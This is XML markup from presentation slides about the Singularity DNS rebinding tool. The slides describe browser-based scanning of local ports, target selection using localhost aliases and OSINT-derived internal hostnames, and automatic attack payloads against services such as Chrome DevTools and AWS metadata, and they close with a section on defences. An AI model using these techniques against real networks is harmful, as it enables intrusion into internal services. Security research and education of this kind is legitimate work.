        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1445675"/>
            <a:ext cx="8520600" cy="312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a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Wrap in a web worker - distribute scan targets across 4 web workers</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fetch() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>resource headers with timeout (300 ms) - Don’t bother with resp. body</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Timeout drives how fast scans can go - how long we hang, waiting for a response</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>When an unhandled protocol (e.g. SSH) or when a port is firewalled (No TCP RST packet)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Fast</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> for: open HTTP ports, closed ports</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Slower</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> for: firewalled ports, slow HTTP services &amp; possibly specific protocols</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Pro-tip:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Use a lower timeout when scanning LAN and/or fast HTTP services.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Use higher timeouts when scanning different networks e.g. across VPN.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>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86" name="Shape 586"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="587" name="Google Shape;587;p7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Leveraging Modern APIs and Focusing on What Matters (fetch, abort, http only)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="588" name="Google Shape;588;p78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1445675"/>
            <a:ext cx="8520600" cy="312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 bits and pieces</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Use the classical WebRTC IP address leak when available to obtain the IP address of the machine and derive a subnet (Chrome, Firefox).</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fetch ('http://127.0.0.1', {credentials: omit})</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> → No authentication dialog box → Victim 😌.  . Didn’t we cover this before? 🤔</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Considering performing a second scan pass for potentially slower services (Singularity implementation TODO list).</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="589" name="Google Shape;589;p78"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1504369" y="2951600"/>
            <a:ext cx="376825" cy="387900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="590" name="Google Shape;590;p78"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4982225" y="2951600"/>
            <a:ext cx="446550" cy="4236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94" name="Shape 594"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="595" name="Google Shape;595;p7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Automation: Service</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Detection &amp; Exploitation and Orchestrating all the Above</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99" name="Shape 599"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="600" name="Google Shape;600;p8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Auto Detection and Exploitation of All Things Accessible by the Target Web Browsers</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="601" name="Google Shape;601;p80"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1527575"/>
            <a:ext cx="8520600" cy="3041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t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Autoattack.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>” automation and orchestration sample file</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Customizable</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Permits to leverage all features of Singularity</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Specific exploitation payload or auto-selection of payload to deliver based on detected service</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Targets selection + optional detection</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Ports selection + optional port scanning</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Default DNS strategy selection + optional detection of best strategy to use in specific cases</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Various options such as flooding DNS cache, visibly hiding activity etc.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Future work: more auto-optimization so you don’t have to read the extensive wiki (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1100" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://github.com/nccgroup/singularity/wiki</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>) .</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="602" name="Google Shape;602;p80"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4229100" y="4320850"/>
            <a:ext cx="418425" cy="47653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06" name="Shape 606"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="607" name="Google Shape;607;p8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Choosing the Right Targets 0.0.0.0, "localhost", CNAMES, Weak Host Model</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="608" name="Google Shape;608;p81"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1533175"/>
            <a:ext cx="8520600" cy="3035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Mix and match different </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng"/>
              <a:t>specifications of same target</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> for reliability, security controls bypass and speed (“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0.0.0.0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>”, “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>localhost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>”, “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>127.0.0.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>”).</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Find and use the external IP address to exploit routers / Wifi APs’ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng"/>
              <a:t>internal network facing administration interface</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> (weak end system model - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1100" u="sng">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://www.defcon.org/images/defcon-18/dc-18-presentations/Heffner/DEFCON-18-Heffner-Routers-WP.pdf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> )</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Do some homework using </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>OSINT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>try</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> to determine the local corporate domains, use a dictionary of service names and specify them as CNAMES e.g. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>jenkins.internal.corp.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>. This is likely to pay off. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="609" name="Google Shape;609;p81"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6461800" y="3777725"/>
            <a:ext cx="2425826" cy="122637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13" name="Shape 613"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="614" name="Google Shape;614;p8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Service Detection</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="615" name="Google Shape;615;p8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Singularity comes with a number of attack payloads targeting services such as Chrome DevTools Remote Debugger, Amazon AWS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>instance </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>metadata, Ruby on Rails etc.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>We recently augmented a number of its </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng"/>
              <a:t>payloads with a service detection routine</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>.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Selecting the “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>automatic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>” payload will instruct Singularity to detect the service and </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>deliver the appropriate attack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>!</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="616" name="Google Shape;616;p82"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1885950" y="2965650"/>
            <a:ext cx="5372100" cy="9525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20" name="Shape 620"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="621" name="Google Shape;621;p8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Concluding Remarks: There is Only One HTTP Origin</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25" name="Shape 625"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="626" name="Google Shape;626;p8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Protect From DNS Rebinding: </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en"/>
            </a:br>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="627" name="Google Shape;627;p8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rPr lang="en"/>
              <a:t>Use DNS blacklists</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Use DNSSec?</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Use this DNS service provider</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Use this router/appliance/IPS!</a:t>
            </a:r>
            <a:endParaRPr b="1"/>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31" name="Shape 631"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="632" name="Google Shape;632;p8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Protect From DNS Rebinding: </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en"/>
            </a:br>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Common Wisdom is Not Enough</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="633" name="Google Shape;633;p8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rPr lang="en"/>
              <a:t>Use DNS blacklists</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Use DNSSec </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Use this DNS service provider</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Use this router/appliance/IPS!</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr b="1" lang="en"/>
            </a:br>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>...Do you understand all the subtleties of DNS rebinding? </a:t>
            </a:r>
            <a:r>
              <a:rPr i="1" lang="en"/>
